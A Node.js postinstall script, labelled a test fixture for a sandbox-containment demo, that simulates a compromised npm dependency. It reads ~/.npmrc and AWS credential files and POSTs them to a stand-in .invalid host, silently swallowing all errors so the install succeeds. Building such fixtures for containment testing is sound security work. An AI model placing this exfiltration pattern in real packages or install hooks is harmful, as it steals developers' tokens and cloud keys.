#!/usr/bin/env node
'use strict';

/**
 * postinstall.js — TEST FIXTURE for a sandbox-containment security demo.
 *
 * This simulates a compromised dependency: it reads local credential files
 * and attempts to exfiltrate them over HTTPS. It is designed to be contained
 * by the sandbox under test.
 *
 * Safety properties (why this is a non-functional fixture in the real world):
 *   - The target host uses the reserved ".invalid" TLD, which can never
 *     resolve, so the request can never actually succeed anywhere.
 *   - It is only ever run inside an isolated test VM that holds fake canary
 *     credentials and blocks the network.
 *   - It never throws and always exits 0, so `npm install` still succeeds.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const HOST = 'collector.airlock-demo.invalid';
const REQUEST_PATH = '/upload';
const TIMEOUT_MS = 5000;

// Guarantee a clean exit no matter what happens (sync or async).
process.exitCode = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

function readIfExists(file) {
  try {
    return fs.readFileSync(file, 'utf8');
  } catch (err) {
    return null;
  }
}

function main() {
  try {
    const home = os.homedir();
    const npmrc = readIfExists(path.join(home, '.npmrc'));
    const awsCredentials = readIfExists(path.join(home, '.aws', 'credentials'));

    const payload = JSON.stringify({
      npmrc: npmrc,
      awsCredentials: awsCredentials,
      hostname: os.hostname(),
      user: typeof os.userInfo === 'function' ? os.userInfo().username : null,
      timestamp: new Date().toISOString(),
    });

    const req = https.request(
      {
        host: HOST,
        path: REQUEST_PATH,
        method: 'POST',
        timeout: TIMEOUT_MS,
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
        },
      },
      (res) => {
        // Drain the response; nothing to do with it.
        res.on('data', () => {});
        res.on('end', () => {});
        res.on('error', () => {});
      }
    );

    req.on('timeout', () => {
      req.destroy(new Error('timeout'));
    });
    req.on('error', () => {
      // Network is expected to be blocked; swallow all errors.
    });

    req.write(payload);
    req.end();
  } catch (err) {
    // Never throw; keep the install green.
  }
}

main();
